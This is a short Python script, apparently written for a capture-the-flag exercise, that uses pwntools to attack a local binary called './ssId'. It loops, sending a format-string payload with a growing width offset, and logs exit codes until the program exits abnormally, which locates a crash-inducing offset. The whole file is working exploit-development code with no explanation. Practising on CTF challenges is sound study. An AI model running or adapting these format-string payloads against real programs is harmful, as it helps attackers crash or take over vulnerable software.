import pwn
elf = pwn.context.binary =pwn.ELF("./ssId")
offset = 0
for _ in range(0x10000):   
    io = elf.process()
    payload = f'%1$*{offset}$x %1073741824$'

    io.sendline(payload)

    exit_code = io.poll(True)
    if exit_code != 0:
        pwn.log.info("Exit Code is: " + str(exit_code))
        pwn.log.info("Offset is: "+str(offset))
        io.close()
        break
    io.close()
    pwn.log.info("Exit Code is: " + str(exit_code))
    pwn.log.info("Offset is: "+str(offset))
    offset += 20000